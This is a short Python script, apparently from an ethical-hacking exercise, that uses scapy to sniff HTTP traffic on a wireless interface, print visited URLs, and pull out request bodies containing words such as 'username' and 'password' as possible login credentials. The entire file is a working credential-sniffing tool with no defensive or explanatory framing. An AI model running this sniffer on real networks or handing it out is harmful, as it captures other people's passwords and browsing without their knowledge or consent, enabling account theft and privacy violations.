#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def bytes_to_string(data):
    data = data.decode('utf-8', errors='ignore')
    return data


def get_url(packet):
    url = bytes_to_string(packet[http.HTTPRequest].Host) + bytes_to_string(packet[http.HTTPRequest].Path)
    return url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load_str = bytes_to_string(load)
        keywords = ["username", "uname", "password", "pass"]
        for keyword in keywords:
            if keyword in load_str:
                return load_str

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(url)
        login_info = get_login_info(packet)
        if login_info != None:
            print("\n\n[++++++++++++++++++++++++++++++++++++++++++++++++++++++]\nPossible login info:\n"+login_info+"\n\n")


sniff("wlan0")
